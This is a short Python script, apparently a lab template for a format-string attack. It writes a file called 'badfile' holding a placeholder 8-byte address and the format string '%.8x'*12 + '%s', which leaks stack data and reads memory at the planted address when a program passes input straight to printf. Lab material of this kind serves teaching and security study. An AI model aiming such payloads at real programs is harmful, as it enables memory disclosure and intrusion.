#!/usr/bin/env python3
import sys

# Initialize the content array
N = 1500
content = bytearray(0x0 for i in range(N))

# This line shows how to store an integer at offset 0
number  = 0x11223344aabbccdd
content[0:8]  =  (number).to_bytes(8,byteorder='little')


# This line shows how to construct a string s with
#   12 of "%.8x", concatenated with a "%s"
s = "%.8x"*12 + "%s"

# The line shows how to store the string s at offset 16
fmt  = (s).encode('latin-1')
content[16:16+len(fmt)] = fmt

# Write the content to badfile
file = open("badfile", "wb")
file.write(content)
file.close()

